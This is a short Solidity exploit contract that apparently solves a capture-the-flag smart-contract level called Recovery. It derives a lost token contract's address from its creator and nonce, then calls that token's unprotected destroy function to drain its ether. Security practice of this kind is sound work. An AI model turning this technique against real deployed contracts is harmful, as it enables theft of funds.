
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Recovery/Recovery.sol";
import "exploits/BlockUtils.sol";
import "lib/forge-std/src/console.sol";

contract RecoveryExploit is BlockUtils {
    Recovery victim;

    constructor(address _victim) {
        victim = Recovery(payable(_victim));
    }

    function hack() public {
        address tokenaddress = getAddressFromCreatorAndNonce(address(victim), 0);
        SimpleToken token = SimpleToken(payable(tokenaddress));
        token.destroy(payable(address(this)));
    }
    receive() external payable {
    }
}